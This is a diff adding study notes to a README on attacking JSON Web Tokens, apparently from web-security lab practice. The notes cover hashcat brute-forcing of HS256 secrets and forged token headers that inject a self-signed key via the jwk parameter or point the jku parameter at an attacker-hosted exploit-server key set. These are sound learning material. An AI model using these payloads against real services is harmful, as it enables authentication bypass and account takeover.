@@ -11,3 +11,57 @@
 
 
 <img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/7d2ae94f-851c-419a-92e8-babaaa454ff4" />
+
+# COMMON ATTACKS
+## Brute-forcing secret keys
+```bash
+# HS256
+hashcat -a 0 -m 16500 <jwt> <wordlist>
+```
+## JWT header parameter injections
+
+- alg: mandatory
+- jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
+- jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
+- kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.
+### Injecting self-signed JWTs via the jwk parameter
+Note: Only for Asymmetric Keys and use the option Attack -> Embdded JWK
+```bash
+{
+    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+    }
+}
+```
+## Injecting self-signed JWTs via the jku parameter
+Note: JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /.well-known/jwks.json
+1. Find the url where stotre jwks.json
+2. Create a random RSA Key
+3. Create or Copy RSA Key
+```bash
+{
+    "keys": [
+        {
+    "kty": "RSA",
+    "e": "AQAB",
+    "kid": "ae125b7c-41a1-44de-9564-6616f85e259b",
+    "n": "olG-J-_2UqeaKWtnHxBczrlRWZdk0DL70GFhYiQKplRk72PMX-BElSwOhq7TCX7FVAIgaf1iaZsHymiXzW-2pABybXND0dDczDs1Z-hFvNekj-xpngBbxjeZEWIG9JV158lJqvbpcI-cRsDSE05t-ojSomhcEEmYl28XHQ9vzYK5tfARdE2Tp9Ra2Uj8IcTwUQoQjSUlpOPUdTtKLKX7XkAS3NJtG4gEVO1DcFx513TN628YXyIERC6E97lgM08ChrkD3LcPDzaHL52YnDugkbYS46gmZaY8v9Tp7UVvD9_aBMkjSr3JjgGW9qxibQstQGEFuQxnczu7ToxQtwz79w"
+        }
+    ]
+}
+```
+5. Upaload kid and create jku parameter
+```bash
+{
+    "kid": "ae125b7c-41a1-44de-9564-6616f85e259b",
+    "alg": "RS256",
+    "jku": "https://exploit-0a0d0018034482a8838c047301c20056.exploit-server.net/exploit"
+}
+```
+7. Finally I had to upload signature
